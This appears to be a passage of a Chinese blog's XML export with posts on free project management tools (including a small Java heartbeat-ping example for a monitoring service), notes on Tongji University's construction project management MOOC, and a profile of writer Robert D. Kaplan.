    <content type="text"><![CDATA[摘要 信息化带来的价值可以占到总投资的10%以上。换句话说，一个工程项目如果管理信息化工作成功了，可以节省十分之一的投资，这是一个非常可观的数据。所以如何做好工程管理信息化，如何将信息资源开发好，将信息技术利用好，对现在乃至将来的工程建设有着重大的意义。—— 丁士昭 项目管理信息系统，PMIS–Project Management Information System 任务管理 《凤凰项目》| 从作坊到工厂的寓言故事 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 资源管理 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 行业应用案例DevOps：从供应链管理到软件研发管理 Kanban 看板管理实践 《凤凰项目》：从作坊到工厂的寓言故事 Free Project Management Tools (Single User &amp; Startup Company) Free is not free Overview of Free Project Management Tools Name focus free version company version UI Asana tracking everything 15 members yes beautiful Paper real-time reporting Trello Kanban system 10MB attach files yes PushMon monitor cronjobs scripts 3 URLs, 4 credits yes Teamweek manage schedules 5 members yes ClickUp solution all features no Wrike OpenProject Gantt Project gantt MelsterTask KanbanFlow Kanban board Labourhood Kanban Tool Kanban board Redmine professional open-sourced no normal Airtable Barvas actiTIME Asana focus：tracking everything License：15 members Cost：free Paper focus：created by Dropbox;capture, organize, and prioritize issues, plan sprints, and take advantage of real-time reporting. License： Cost：free Trello focus: It implements the Kanban system License：free &amp; company Cost：free version can add 10MB of files from your computer or link any file in Google Drive, Box, OneDrive, and Dropbox accounts and you can add a max of 1 power-up per board. PushMon focus: not a typical project management tool;It is used to monitor scripts, cronjobs, and scheduled tasks and get notifications directly to your email, mobile phone, etc. License：free &amp; company Cost：The free version of PusMon gives you access to 3 URLs, 4 credits, and instant notification alerts via email, SMS, Twitter, IFTTT, phone calls, etc. 123456789101112131415161718192021222324package com.teamextension.ping;import java.io.InputStream;import java.net.URL;import java.net.URLConnection;public class UrlPing &#123; public static void main(String[] args) &#123; String urlString = "http://pshmn.com/eaFnY"; pingUrl(urlString); &#125; private static void pingUrl(String urlString) &#123; try &#123; URLConnection conn = new URL(urlString).openConnection(); conn.setConnectTimeout(5000); conn.setReadTimeout(5000); InputStream is = conn.getInputStream(); is.close(); &#125; catch (Exception e) &#123; // log error &#125; &#125;&#125; Teamweek focus: track of deadlines in calendar form, manage schedules, create Gantt charts. License：free &amp; company Cost：The free version allows a maximum of 5 team members. ClickUp focus: project management solution. License：free &amp; company Cost：The free version gives you access to unlimited users, tasks, and projects. Wrike focus: simplify your project plans, streamline your workflow, and enable collaboration. License：free &amp; company Cost：The free version allows a maximum of users in a team and you can use a simple shared task list for your projects. OpenProject focus: simplify your project plans, streamline your workflow, and enable collaboration. License：open-source &amp; free &amp; company (Community, Cloud, and Enterprise) Cost：The community edition is available for free with features including time management, team collaboration, Gantt charts for project planning, budgeting, and reporting. It also supports Agile for project management with backlogs, roadmaps, bug tracking, etc. Gantt Project focus: a work breakdown structure, draw dependency constraints, PERT charts, etc. License：free software; GPL license. Cost：java-based ; US$5 ? download gantt project MeisterTask focus: License：version contains all the options required for creating unlimited projects and tasks. You can also collaborate on invited friends in real-time. KanbanFlow focus: a Lean tool for project management License：free. Labourhood focus: Labourhood is an online project management tool that focuses on online collaboration, networking, and security. License：free. Cost: Labourhood still in Beta version which is free to use all you have to do is sign up to create a free account. Kanban Tool focus: Kanban Tool is an online ponline Kanban board. License：a 14-day free trial you can experiment with. Redmine focus: professional features. License：free &amp; open-source. Cost：It is written using the Ruby on Rails framework. PM指南:开源项目管理平台Redmine|工具与技术 Airtable focus: spreadsheet-database hybrid. License：free. Cost：It is written using the Ruby on Rails framework. Barvas focus: focuses on improving your workflow and team productivity. License：free(a single user account which is limited to a single project). Cost： Access to unlimited projects costs $11.70 and the subscription is $5.85 per month. actiTIME focus: time tracking and using intelligent methods to analyze data License：free for up to 3 users Cost： $394.00 USD per year for 5 users ($6.57/month per user). 拓展阅读 项目管理 | Overview of Project Management PM指南:PMI项目管理知识体系 PM指南:建筑工程项目管理|行业案例教学 PM指南:范围管理 PM指南:进度管理 PM指南:成本管理 PM指南:质量管理 PM指南:资源管理 PM指南:沟通管理 PM指南:风险管理 PM指南:采购管理 PM指南:相关方管理 PM指南:网络计划技术|工具与技术 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 技术专题 DevOps 漫谈系列 DevOps 漫谈：基础设施部署和配置管理 DevOps 漫谈：Linux 容器安全的十重境界 参考文献 Comparison of project management software 17 Best Free Project Management Tools for You | May 7, 2019by Martins D. Okoi]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PM指南:建筑工程项目管理]]></title>
    <url>%2F2019%2F03%2F27%2FProject-Construction%2F</url>
    <content type="text"><![CDATA[摘要 《工程项目管理》| 同济大学MOOC课程 理论：组织论、信息论、项目控制论 重点：投资控制、进度控制、质量控制、风险控制 技术：网络规划技术、项目管理软件（MS Project/P3/P6）、BIM 案例：上海地铁、上海虹桥交通枢纽、上海世博会、广州地铁、广州新白云机场 按照维基百科的解释，工程学是指将知识（通常是科学，数学和经验）应用于结构，机器，材料，设备，系统，过程和组织的创新，设计，构造，操作和维护。 Engineering is the application of knowledge, typically in the form of science, mathematics, and empirical evidence, to the innovation, design, construction, operation and maintenance of structures, machines, materials, devices, systems, processes, and organizations. 常识告诉我们，无论是传统的建筑工程、交通工程，还是较为年轻的计算机工程、软件工程，大量的术语和管理思维其实源于建筑业 —— 也就是诸多从业人员口中常说的”搬砖“。 最近我有一个想法，即无论从事何种类别的工程职业——以”搬砖“活动谋生的从业人群都有必要了解一些土木工程知识，因为历史已经反复证明，古老建筑行业的叙事逻辑早早晚晚都要在所有新兴行业推广。 《工程项目管理》| 同济大学MOOC课程《工程项目管理》MOOC课程是同济大学多年建设打造的一门国家精品课程。课程由我国工程管理界著名教授丁士昭先生主持（同济大学工程管理研究所创始人、名誉所长）。 组织论是项目管理的母学科。 个人认为同济大学的《工程项目管理》本课程有 两大特色： 第一，理论体系高度突出“组织理论（Organization Theory）”，可以说组织论与信息论是贯穿整个课程的两大基石。丁老师的观点是，学习项目管理之前很有必要先学习组织论。（《组织理论与设计》，Richard L. Daft著） 第二，高度突出信息论，强调项目管理的实质是知识管理、是面向专业人士的 Professional Management 。 第三，理论联系实际，讲师团队本身具有强大的工程实践背景，课件中援引了大量一线工程的实际素材。 现代意义的建筑师出现在欧洲，最早的建筑师就是总营造师，也称建筑师傅。建筑师负责设计、购买材料、雇佣工匠，并管理工程施工。 16世纪至18世纪中期，欧洲兴起华丽的花型建筑热潮，在建筑师队伍中开始形成了分工，一部分建筑师联合起来专注于进行设计，另一部分建筑师则负责组织、监督施工，逐步开始了设计和施工的分离，并逐步形成了更加精细的专业分工。例如： 营造师（Master Builder）：作为建筑项目的最高领导者，负责跟进整个工程项目。 建造师（Constructor）：负责全面的组织管理，以工程项目施工管理为主业，通常为项目经理或相关负责人。 建筑师（Architect）：负责设计建筑物平面图的专业人士。建筑师需要兼备艺术家的审美眼光和工程师的力学知识，作品需要从力学角度计算，选取合适的工程材料才能实现。 即使是技术最成熟的建筑工程行业，组织和管理活动依然占据核心的位置，这个问题本身就已经很有意思。 课程内容课程配套教材为《工程项目管理》，丁士昭主编，中国建筑工业出版社。 教学内容分别为基础理论知识模块、案例与实务模块及工程管理创新与前沿模块。 基础理论知识 涵盖了工程管理的全面知识领域，包括工程项目管理概述、组织理论、目标控制基本原理、项目策划、投资控制、进度控制、工程项目质量控制和安全管理、工程项目管理信息化、设计阶段的项目管理、采购阶段的项目管理、施工阶段的项目管理、项目运营管理。 案例与实务 构建了工程管理的案例库，包括The Domain of Project Management、How the 6th version of PMBOK GUILDE was born、重大基础设施建设项目策划—-聚焦上海虹桥综合交通枢纽案例、上海虹桥综合交通枢纽工程进度总控、Virtual Design &amp; Construction - An Introduction、BIM技术与安全应急管理、2010年上海世博会工程建设项目管理、国际建筑业绩效管理的现状和实践、新时期施工管理的新问题、大型保障房项目建设管理创新与实践、基础设施项目群建设管理：长春市案例等。 创新与实践 聚焦了工程管理的新视角，包括哲学视野中的工程、三峡工程项目管理、The Past, Present and Future of Project Management、升级中的中国对外承包业、关于中国建筑业改革发展的探讨、借鉴国际经验推进建设管理的全面深化改革、运用国际项目管理新理论7门精彩讲座，融合了工程院院士及国内外工程管理一线专家的真知灼见。 按照设计，完成所有MOOC课程10周时间。 http://www.icourse163.org/learn/TONGJI-46008?tid=1003249011 授课讲师 姓名 简介 主讲内容 丁士昭 同济大学工程管理研究所创始人、名誉所长。 德国达姆斯塔特工业大学，工学博士 概论、组织理论、工程控制论、工程顾问、工程监理、政策法律 何清华 研究领域：建设工程项目管理、重大/复杂工程管理、精益建设 动态控制原理（目标控制、进度控制、质量控制）案例（） 乐云 研究领域：建设工程项目管理，包括项目前期策划、大型复杂工程项目组织管理、承发包模式与合同管理、工程管理信息化等 项目策划、案例（上海世博会工程进度总控） 张建国 研究领域主要有工程造价管理理论与方法、工程进度优化与控制、可持续建设、建筑服务贸易、IT在工程管理中应用等 工程项目投资控制、案例（上海虹桥综合交通枢纽交通中心工程、浦东国际机场扩建工程投资控制） 高欣 研究领域：城市管理与建设工程管理、项目管理、大型建设工程进度规划与控制、建设工程风险管理与保险 网络规划技术、案例（广州白云国际机场扩建工程总进度控制） 贾广社 案例（上海虹桥交通枢纽工程进度总控） 王广斌 研究领域：项目管理、工程管理信息化、项目投融资 案例（中德友好医院） 丁士昭 。1940年9月26日出生于上海。1963年毕业于同济大学建筑工程系，同济大学工程管理研究所创始人、名誉所长。主要从事建筑经济、建设项目策划、项目管理等方面的研究。 何清华。同济大学经济与管理学院建设管理与房地产系教授、博士生导师。同济大学复杂工程管理研究院副院长兼精益建设研究中心主任。 乐云。同济大学经济与管理学院建设管理与房地产系教授、博士生导师。同济大学复杂工程管理研究院副院长。研究领域为建设工程项目管理，包括项目前期策划、大型复杂工程项目组织管理、承发包模式与合同管理、工程管理信息化等。（教育部2015年7月6日通报同济大学经济与管理学院建设管理与房地产系存在公款出国旅游问题，系主任乐云受到党内严重警告处分） 张建国。管理学博士。同济大学经济与管理学院建设管理与房地产系教授、博士生导师。同济大学工程管理研究所所长。研究领域主要有工程造价管理理论与方法、工程进度优化与控制、可持续建设、建筑服务贸易、IT在工程管理中应用等。 高欣。同济大学经济与管理学院建设管理与房地产系教授，博士生导师。同济大学基建处长。研究领域：城市管理与建设工程管理、项目管理、大型建设工程进度规划与控制、建设工程风险管理与保险。 贾广社。同济大学经济与管理学院建设管理与房地产系教授。1982年，新疆工学院获工学学士学位 工民建专业，2000年，同济大学获管理学博士学位 工程管理专业。研究与领域工程项目管理、大型建设工程项目总控、项目管理成熟度，跨学科研究：建设工程社会学、工程哲学。 王广斌。同济大学经济与管理学院副院长。中国图学学会BIM委员会副主任委员、中国建设教育协会BIM委员会副主任委员、中国工程建设标准化协会建筑信息模型BIM专业委员会理事。 曹吉鸣，博士、教授、博士生导师，同济大学复杂工程管理研究院副院长，设施管理研究中心主任。 1.1 工程项目管理概论（丁士昭）（推荐） 英语：Professional Management in Construction （1997年华盛顿会议） 美国：Construction Management 项目控制论，项目总控：Project Controlling 工程项目周期 项目策划，DM–Development Management 项目管理，PM–Project Management 营建管理，CM–Construction Management 1.2 项目管理的组织理论（丁士昭）（推荐） 组织论是项目管理的母学科。 推荐阅读：《组织理论与设计》 1.3 The Domain of Project Management（Monique Aubry）2.1 工程项目目标控制的基本原理（何清华）（推荐） 动态控制原理在目标控制的应用 动态控制原理在投资控制的应用 动态控制原理在质量控制的应用 2.1.6 项目风险管理基本原理2.1.7 工程项目风险管理 风险定性分析方法：P-I矩阵 2.2 项目策划（乐云）（推荐） 2.2.1 基本原理 2.2.2 环境调查与分析 2.2.3 项目定义与项目功能分析 2.2.4 2.2.5 项目实施策划 案例：上海世博会工程总进度计划（2007年11月） 2.2.6 2.2.7 项目实施的组织策划 组织结构策划 任务分工策划 管理职能分工策划 工作流程策划 2.2.8 项目实施的目标控制策划 进度目标控制策划 投资目标控制策划 质量目标控制策划 3.1 工程项目投资控制（张建国）（推荐） 3.1.5 谁对项目投资费用有影响 3.2 网络计划技术（高欣）（推荐） 工程项目进度计划的编制方法 工程项目进度计划系统 工程项目进度控制 PM指南:网络计划技术|工具与技术 3.2.9 工程项目进度管理案例 广州白云国际机场扩建工程总进度计划 3.3 案例教学|上海虹桥交通枢纽工程进度总控（贾广社）（推荐） 项目总控理论概述 进度总控实践 进度总控实践与创新 4.1 工程项目质量控制和安全管理（贾广社）4.2 计算机、网络平台和BIM在建设项目管理中的应用（王广斌） 案例：中德友好医院 4.3 案例与实务| Virtual Design &amp; Construction - An Introduction（）5.1 工程设计阶段的项目管理（李永奎，副教授） 5.5.1 设计任务的委托和设计合同管理 5.2 工程项目的采购管理（孙继德，副教授）6.1 施工阶段的项目管理（曹吉鸣）6.2 建设项目的运营管理（曹吉鸣）6.3 案例与实务|国际建筑业绩效管理的现状与实践（戴久坤）6.4 关于建筑业改革发展的探讨（吴慧娟，住建部工程质量安全监管司） 7.1 案例与实务|中国2010年上海世博会工程建设项目管理（乐云）（推荐）7.2 新时期施工管理的新问题（施骞）（推荐） 施工质量安全控制中的关键问题 8.1 案例教学|上海虹桥综合交通枢纽（刘武君，上海机场集团总工程师） 重大项目策划 8.2 案例教学|大型保障房项目建设管理（陈兴汉，南东栖霞建设集团总经理）8.3 案例与实务|基础设施项目群建设管理：长春市案例（李永奎，副教授）9.1 哲学视野中的工程（殷瑞钰，原冶金部副部长）9.2 三峡工程项目管理（陆佑楣，原能源部副部长、三峡总公司总经理）10.1 工程管理创新与实践（丁士昭）10.2 The Past,Present and Future of Project Management（Dr. Ediwin J. Andrews）10.3 升级中的中国对外承包业（吴之昕|中建一局总工）案例作业 美国国防部“北极星”项目 上海地铁一号线建设的组织策划（1990）； 上海虹桥交通枢纽（虹桥机场+高铁上海站）项目 广州地铁首期工程建设项目管理总体方案（1991.11–1992.5）； 广州新白云机场建设总进度计划纲要（2000.11–2001.2） 阅读作业 《工程项目管理》，丁士昭主编，中国建筑工业出版社 《组织理论与设计(第10版)》，Richard L. Daft著 《项目管理 - 计划、进度和控制的系统方法》| 哈罗德·柯兹纳(Harold Kerzner) 《项目管理知识体系指南 (PMBOK Guide)》, 美国项目管理协会（PMI） 《建设工程项目管理（第三版）》，中国建筑工业出版社，2011 《工程项目前期策划》，乐云、李永奎，中国建筑工业出版社，2011 《工程施工组织与管理》，曹吉鸣，中国建筑工业出版社 ，2012 《建设工程项目管理成熟度理论及应用》，贾广社、陈建国，中国建筑工业出版社，2012 《工程项目管理》，乐云、邓铁军，武汉理工大学出版社，2008 《项目管理》，何清华，同济大学出版社,2011 《工程管理概论（第二版）》，成虎，中国建筑工业出版社，2011 《建设工程管理概论》，任宏，武汉理工大学出版社，2008 《工程计量与造价管理(第三版)》，陈建国、高显义，同济大学出版社，2010 《工程计价与造价管理》，陈建国、高显义，中国建筑工业出版社，2011 《项目总控–建设工程的新型管理模式》，贾广社，同济大学出版社，2003 《成功的项目管理（第5版）》，（美）克莱门斯、（美）吉多著，张金成、杨坤译，电子工业出版社，2012 MOOC资源 《工程项目管理》| 同济大学 MOOC 课程 学习小组​​感兴趣的朋友可以加入知识星球共同学习，链接 https://t.zsxq.com/qvnYNbE 拓展阅读翻译卡片建筑工程（简称：AE、BE、CE，英语：Architectural engineering、Building Engineering、Construction Engineering），原称为土木工程，是一个关于建筑物的施工和内部设施安装的工程学。 人物卡片：丁士昭丁士昭履历1952–1955，上海，南洋模范中学，初中1955–1958，上海，上海中学，高中1958–1963，上海，同济大学 建筑工程系，建筑工程经济与组织专业1963–1978，同济大学 建筑施工组织教研室，助教1978–1985，同济大学 建筑管理教研室，讲师1980.10–1982.10，联邦德国，达姆斯塔特技术大学（Technische Universitaet Darmstadt），科研、进修。1983–1985，同济大学 建筑管理教研室，主任1985.4–1985.12，联邦德国，达姆斯塔特技术大学，土木工程系，工学博士（1985.10）。博士论文–多阶网络法的数学模型、解法和程序。1986–1987，同济大学 经济信息系，副教授1987年–经济信息系 教授、副系主任、经济管理学院副院长1988.10–1989.2, 联邦德国，Integrata 软件公司，科研、进修1991–至今，同济大学 工程管理研究所所长，教授1998.7–1999.1， 日本 名古屋大学客座教授2000.8–2000.10, 联邦德国，Integrata 基金会 主要讲授课程 项目管理 建设监理 建筑经济 算法语言 网络计划技术 建筑施工组织与计划 专业德语 科研成果 主持研制和开发“上海地铁工程项目管理信息系统”，上海市科委组织鉴定，鉴定结论：国内首创，1991年10月 主持编写“广州地铁首期工程项目管理总体方案”，建设部组织鉴定，1992年1月 主持研究“建设项目总承包的理论、方法与手段”，上海市建委组织鉴定，鉴定结论：国内领先，1992年，（该课题由同济大学工程管理研究所、上海华东建筑设计院、中建总公司上海分公司联合研究） 主持研制和开发“上海合流污水处理投资控制信息系统“,上海合流污水处理工程指挥部委托， 1993年 主持研究“中国建设监理模式”，上海市建委组织鉴定、建设部参加鉴定，建设部七五重点项目，鉴定结论：国内领先水平。1995年6月，（该课题由10余人参加，编写科研报告27份） 主持研制和开发“DP-1/CC计算机辅助投资控制系统”，建设部组织鉴定，鉴定结论：国际先进水平，1996年11月，（该课题由同济大学工程管理研究所 与Infoage软件公司联合开发） 主持研究“德国建设管理体制及相关制度的研究”，建设部委托,1998年 主持研究“国际建筑业管理体制、法制与机制的研究”，建设部组织鉴定，中国高校科学技术进步奖，二等奖，2000年 主持研制和开发“长江口深水航道治理工程信息系统”，长江口深水航道治理工程公司委托,1998-2000年 主持研制和开发“天津基础设施综合管理信息系统（TIIMIS）”，天津市建委委托，世界银行贷款项目,1998-2000年 项目管理 项目管理 | Overview of Project Management PM指南:PMI项目管理知识体系 PM指南:建筑工程项目管理|行业案例教学 PM指南:范围管理 PM指南:进度管理 PM指南:成本管理 PM指南:质量管理 PM指南:资源管理 PM指南:沟通管理 PM指南:风险管理 PM指南:采购管理 PM指南:相关方管理 PM指南:网络计划技术|工具与技术 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 参考文献 MOOC 课程表 | 同济大学《工程项目管理》 中国投资体制改革30年研究 &gt; 第三节 项目管理的科学化 政府投资与投资体制改革三十年 | 作者：席月民 | 中国法学网 面向可持续建设的工程管理——访同济大学教授、建设工程领域专家学者丁士昭 《政府工程怎么管:深圳的实践与创新研究》|同济大学丁士昭教授和深圳市建筑工务署杨胜军署长]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[行走的思想家:罗伯特·D.卡普兰]]></title>
    <url>%2F2019%2F03%2F17%2FInternational-Relations-Kaplan%2F</url>
    <content type="text"><![CDATA[摘要 公众的观点 战地记者：冒险者的游戏 旅行者：超越时空的智慧 罗伯特·D.卡普兰（1952年生于纽约），新美国安全中心（CNAS）高级研究员，著名地缘政治分析家。卡普兰长期为《大西洋月刊》《纽约时报》《华盛顿邮报》《新共和》《华尔街日报》《国际利益》等媒体撰写评论，也曾被《外交政策》杂志评为全球100大思想家之一。主要作品有《地理的报复》《巴尔干之魂：历史之旅》《东进鞑靼大地》《帝国最前线》《季风：印度洋与美国权力的未来》《即将到来的无政府状态：打破冷战后的梦想》《亚洲熔炉：南海和太平洋稳定局势的终结》等。 公众的观点第一次了解卡普兰是通过一本很有意思的小册子 ——《武士政治》(Warrior Politics)。 这本小册子完全可以算是粗糙的出版物：翻译成中文的篇幅也就13万字而已，却杂糅了丘吉尔、孙武、李维、马基雅维利、康德等人的思想，叙事空间从二次世界大战到古罗马，再兜回东方战国时代。尽管如此，因为作者极具个性的解读而难掩其中的远见卓识。 李维引用费边的话说：“不要在意他们是否把你的谨慎当做胆怯，把你的智慧当做懒惰，把你的慷慨当做软弱；一个明智的敌人害怕你要好过一群愚蠢的朋友夸赞你。李维由此提醒我们，公众的观点一一也就是你身边人的聒噪一一常常是错的。 既然公众的观点常常是错的，我们又应该以何种方式获得对这个世界的认识呢? 2018年,当地时间11月30日美国第41任总统老布什(George Herbert Walker Bush)逝世，享年94岁。由于老布什生前曾担任”驻华大使”（美国驻中华人民共和国北京联络处主任），中国媒体一时之间纷纷转载了《解放日报》早年刊登过的老照片： 中国人民的老朋友、时任美国驻京办主任的老布什期间经常与妻子骑自行车在北京的大街小巷穿行。他经常和妻子骑着自行车穿行于北京的胡同，由于当年外宾稀少，他们曾引起中国老百姓的关注和围观。后来老布什坦承，他之所以整天在北京街头骑车，是因为那时中国政治斗争激烈，他经常“无人搭理”；但这种独特的体验却让他受益匪浅，“每天都有新的发现”。 “在当时，我不能去中国家庭，很难接触到当地人。” 于是他向路人发拍立得照片，或者去商店和服务员搭讪，傍晚遛狗以慢慢深入中国普通百姓的生活。老布什还记得曾经带着他的老妈妈骑车逛北京，当停下来等红灯时，“人们就这样瞪着我，看着老妈妈，他们觉得不可思议。” 人类很容易 “把生动性当标准（Vividness Criterion）”， 人们认为亲身经历过或极为熟悉的事情要比那些不太熟悉的事情更重要。通过旅行的方式——大量的直接接触陌生的地域、人群和文化，可以强化我们对客观世界的主观感受，恰恰是修正易得性偏差（Availability bias）的最佳方式。 我希望真正通过自己的眼睛，去看看真实的中国是什么样的。—— George H. W. Bush 超越时空的智慧相较于老布什总统只是偶尔栖身于一个贫穷帝国的首都而言，卡普兰是一个货真价实的著名战地记者。 从 1975 年起，卡普兰有长达 16 年的时间是在海外度过。他游历阿拉伯和地中海世界，在希腊和葡萄牙生活 9 年之久。直至现在，他已游历了近 70 个国家。世界上哪里有天灾人祸，哪里就有他的身影。他非常自信地认为，真正的新闻并不在白宫，而是在远离白宫的那些不毛之地。他热衷于探索那些兵荒马乱的地方：索马里、卢旺达、阿富汗、刚果、巴尔干地区等。 正因为这样的独特经历，他是20世纪80年代第一个对巴尔干地区即将发生的剧变发出警告的美国作家。卡普兰还曾在以色列国防军服役一年（注：关于这段服役经历没有看到详细描述，很有可能是加入了以色列军事情报局（阿曼，Aman），军情局下面的情报分析处专门负责分析各种情报，尤其观察各恐怖组织的动向等）。 从事新闻报道之外，卡普兰长期为美国安全部门提供咨询服务。他是美国陆军特种部队，美国海军陆战队和美国空军的顾问，在2006 - 2008年，卡普兰在安纳波利斯海军学院教授题为“未来全球安全挑战”课程。也曾在战争学院，联邦调查局，中央情报局，国家安全局，国防部和参谋长联席会议和商业论坛上发表演讲。2002年，他被美国国务院授予“杰出公共服务奖 the United States State Department Distinguished Public Service Award.”。 看一下现在的世界地图，上面绘制着190多个国家，每个国家都由醒目而风格统一的颜色来标示：我们每个人从小到大都看过的这张地图，基本上是现代主义的发明，特别是欧洲殖民主义。我这里所说的现代主义是随着欧洲民族国家的产生而出现的，并被三十年战争结束时封建主义的终结所确立。这场战争发生的时间处于文艺复兴和启蒙运动之间，二者是现代科学的起源。人们突然非常热衷于对事物进行范畴化，进行界定。基于科学测量技术的地图提供了对新的国家体系进行分类的方式，将条条块块拼接成七巧板，中间没有任何过渡地带。“国界”本身就是一个现代概念，在封建时代人们的脑海里并不存在“国界”概念。随着欧洲国家的开疆扩土以及印刷术的推广，地图再生产变得便宜，地图制图学逐渐成为一种创造事实的方法，规定了人们看待世界的方式。—— 罗伯特·D.卡普兰 | 《无政府时代的来临》 在古往今来诸多思想家中，我相信卡普兰心目中真正的精神偶像是温斯顿·丘吉尔。 他们都在追求一种将冒险、旅行、写作融为一体的生活方式，或者说冒险本身就是他们这种人的思考方式之一。 我们这些年轻军官多么羡慕资深的少校在阿布科里战役中冒险的经历啊！我们又是多么羡慕上校获得的一长排荣誉勋章啊！他们不止一次给我们讲述他们以前激动人心的经历，我们百听不厌。我们多么希望也能有类似的记忆匣子，如果需要的话，可以向一群意气相投的观众一遍一遍地打开陈列。—— 温斯顿·S·丘吉尔 |《丘吉尔传·我的青春》p81 在印度边境打仗本身就是一种难得的经理。……当地的帕坦人总是战事不断，不是各种私人间的争斗，就是公共的战争。除了收获的季节，因为生存的需要，他们才会暂时休战。在这里，每个人既是勇士，又是政治家和神学家。每一幢大的房子都是一个堡垒……每个村子都有自己的防御工事，每个家庭都有自己的家族世仇，每个宗族也都有自己的世仇，数不清的部落和各种各样的部落联合体相互之间都有许多仇恨的账需要清算；没有什么是可以遗忘的，每一笔账都要算清楚。温斯顿·S·丘吉尔 |《丘吉尔传·我的青春》p147 丘吉尔早就看透了希特勒，因为丘吉尔对魔鬼的熟知程度非张伯伦所能及。张伯伦的现实主义是浅薄的。他知道人民需要和平，人民要把钱花在国内需求上而不是在武备上，所以他把那些东西给了人民。但是丘吉尔知道的更多。他是一个很少幻想的人，部分原因是他把时间——在他的学生时代之后——用于阅读历史和写作历史，而且他作为士兵和记者亲历了英国的殖民战争。因此，他知道人类是多么强悍和多么无理性。像所有明智的人一样，他朝着悲剧的方向思考：我们创造道德标准是为了衡量我们自己的缺陷。—— 罗伯特·D·卡普兰 | 《武士政治》p020 主要作品《纽约时报》专栏作家托马斯·弗里德曼称他为“后冷战时代至关重要、值得受到广泛关注的四位作家之一”。 《武士政治》 豆瓣|《武士政治》 作者罗伯特•D.卡普兰认为，这个世界既不是现代的，也不是后现代的，而是古代的延续。因此，在本书中，他从孙子、修昔底德、马基雅维里、霍布斯等人的永恒著作中汲取智慧，告诉今天的领导人如何在政治水域中破浪前行。 《季风：印度洋与美国权力的未来》 豆瓣|《季风：印度洋与美国权力的未来》|中国社会科学文献出版社 作者做了大量田野调查考察环印度洋地区的地缘政治。在此过程中作者发现，虽然各国、各人关于权力平衡的视角和观点不尽相同，但一个共识是中国和印度是该地区新兴的力量。随着中印的崛起，各自均要保证“原材料通道的安全”。为验证此假说，作者借鉴了历史学和权力平衡理论的若干观点，并从现实地缘上考察了“阿曼–巴基斯坦–缅甸–印尼” 对原材料运输线的意义，以及可能威胁海洋航线的要素，诸如海盗、种族冲突、或对马六甲海峡的恶意控制。 《巴尔干鬼魂》（Balkan Ghosts） 《纽约时报书评》年度最佳图书 豆瓣|《巴尔干两千年》|北京大学出版社 巴尔干半岛为什么会被称为“欧洲桶”？为什么这个地区会成为欧洲为动荡的地方？地缘学家在游历巴尔干诸国的深沉旅行中，回顾了巴尔干地区的漫长历史，以深刻的洞察力、以冷静犀利的纪实笔触，呈现了这一地区复杂的历史变迁和民族关系以及背后大国势力的竞相角力，从奥斯曼征服到科索沃战争，巴尔干一直扮演着欧亚政治版图变化的重要力量。 《阿拉伯专家》（ The Arabists） 《纽约时报》年度最值得阅读的图书 《华尔街日报》关于美国与中东地区历史关系的五本必读书目之一 《地球边缘》（The Ends of the Earth） 《纽约时报》年度最值得阅读的图书 《荒野帝国：走入美国未来的旅行》（ An Empire Wilderness: Travels into America’s Future） 《纽约时报》年度最值得阅读的图书 《华盛顿邮报》年度最佳图书 《洛杉矶时报》年度最佳图书 1995—1997年，卡普兰在故土美国及周边开始了一场旅行，从堪萨斯走到西海岸，从中部的密苏里走到西部的俄勒冈，从北部的加拿大边境走到南部的墨西哥。透过政治与文化的视角，卡普兰发现了一个转变中的美国——一个在种族、阶层、教育、地理上充满了区隔和断裂的美国。这里，财富在迅速增加，但贫富差距也在进一步拉大；传统的信念已经消逝，而新的信念仅仅处于萌芽状态。这个大国并非衰落，而是正在缓慢而不可逆转地蜕变出一种全新的身份认同。 《即将到来的地缘战争》(The Revenge of Geography） 原作名: The Revenge of Geography:What the Map Tells Us About Coming Conflicts and the Battle Against 副标题: 无法回避的大国冲突及对地理宿命的抗争 豆瓣|《即将到来的地缘战争》|广东人民出版社 卡普兰在本书中以地理为主线。通过对气候、地势和地理位置的考察，卡普兰回顾和分析了欧洲、俄罗斯、中国、印度、土耳其、伊朗和中东等地的历史热点和潜在危机，并全面地预测了欧亚大陆的下一个冲突周期。 《东进鞑靼大地》（Eastward to Tartary） 《纽约时报》年度最值得阅读的图书 《战之华》（Warrior Politics） 《纽约时报》年度最值得阅读的图书 扩展阅读 情绪的动物：认知、偏见与决策 行走的思想家：罗伯特·D.卡普兰 国之重器，在人不在宝 | 挑战者号航天飞机事故调查 红楼故事：康熙的秘密情报系统 参考文献 罗伯特·D.卡普兰：制图者们的谎言 | 腾讯文化 | 2015-08-05 罗伯特•D•卡普兰:地理是理解一切的开端 | 旅行家（2015年2月刊） 罗伯特·D·卡普兰：土耳其的地缘雄心 罗伯特·卡普兰：帝国的陷阱与威权主义]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Travel</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PM指南:项目沟通管理]]></title>
    <url>%2F2019%2F02%2F06%2FProject-Communications%2F</url>
